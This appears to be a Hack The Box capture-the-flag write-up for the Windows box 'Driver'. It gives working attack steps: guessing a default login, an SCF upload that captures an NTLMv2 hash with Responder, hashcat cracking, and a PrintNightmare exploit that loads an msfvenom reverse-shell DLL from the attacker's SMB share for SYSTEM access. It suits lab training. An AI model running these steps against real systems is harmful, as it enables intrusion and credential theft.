---
layout: post
title: HTB Driver Writeup  
subtitle: Easy Box
thumbnail-img: /assets/img/driver.png
tags: [HTB]
---

![Explore](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/driver.png)


| Name | Explore |
| :------ |:--- |
| OS | Windows |
| RELEASE DATE | 02 Oct 2021 |
| DIFFICULTY | Easy |

# Port Scan
IP: 10.10.11.106
```
80/tcp   open  http         Microsoft IIS httpd 10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=MFP Firmware Update Center. Please enter password for admin
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
135/tcp  open  msrpc        Microsoft Windows RPC
445/tcp  open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows
```

# Port 80
Looking at the page we are prompted with a login page for something called "MFP Firmware Update Center" I was able to guess the credentials `admin:admin`

On the page there was an upload section but none of my reverse shells worked. I learned about a "SCF File Attacks" https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/ 

I set up responder to listen 
`responder -wrf --lm -v -I tun0 `
l
Then I uploaded `@test.scf` file

@test.scf
```
[Shell]
Command=2
IconFile=\\KALIIP\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Responder picked up a username and hash
```
[SMB] NTLMv2 Client   : 10.10.11.106                                                                                  
[SMB] NTLMv2 Username : DRIVER\tony                                                                                   
[SMB] NTLMv2 Hash     : tony::DRIVER:b15c2e7f85d718a9:6E36D9DDD484EACD50000FB0BFDEF4BE:0101000000000000878E404A5DD0D7014A4697B1EBFEE0A900000000020000000000000000000000
```

Now we can crack this hash using hashcat, I used my host machine 
`PS C:\hashcat-6.2.3> ./hashcat.exe -m 5600 ..\hash.txt ..\rockyou.txt`

It cracks it and we get a login of `tony:liltony`

## Priv Esc

We can use our credentials to log in with evil-winrm
```
──(root💀kali)-[~/htb/driver]                                                                                        
└─# /opt/evil-winrm/evil-winrm.rb -i 10.10.11.106 -u tony -p liltony
```

Since this is a printer website and PrinterNightmare just came out lets try giving it a try I used Cube0x0's script https://github.com/cube0x0/CVE-2021-1675

Step 1 is to install Cube's version of impacket
```
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

Then lets get the exploit
`git clone https://github.com/cube0x0/CVE-2021-1675.git`

We will need to set up a SMB server on kali I used these configurations
`/etc/samba/smb.conf`

```
[global]
    map to guest = Bad User
    server role = standalone server
    usershare allow guests = yes
    idmap config * : backend = tdb
    smb ports = 445

[share]
    comment = Samba
    path = /srv/smb/
    guest ok = yes
    read only = no
    browsable = yes
    force user = nobody

```

Restart the service. (Make sure to turn off impacket or it will mess things up)
`service smbd restart`

Then we need to create a payload, copy it to /srv/smb/
```
┌──(root💀kali)-[/etc/samba]
└─# msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=YOURIP LPORT=4444 -f dll -o  /srv/smb/rev.dll
```

Now we can run our exploit and get a reverse shell as authority

Set up a listener
`nc -lvnp 4444`

Run the exploit
`./CVE-2021-1675.py 'DRIVER/tony:liltony@10.10.11.106' '\\KALIIP\share\rev.dll' `

And we get root!
```
┌──(root💀kali)-[~/htb]                                                                                               
└─# nc -lvnp 4444                                                                                                     
listening on [any] 4444 ...                                                                                           
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.106] 49436                                                          
Microsoft Windows [Version 10.0.10240]                                                                                
(c) 2015 Microsoft Corporation. All rights reserved.                                                                  
                                                                                                                      
C:\Windows\system32>                                                                                                  
                                                                                                                      
C:\Windows\system32>whoami                                                                                            
whoami                                                                                                                
nt authority\system 
```
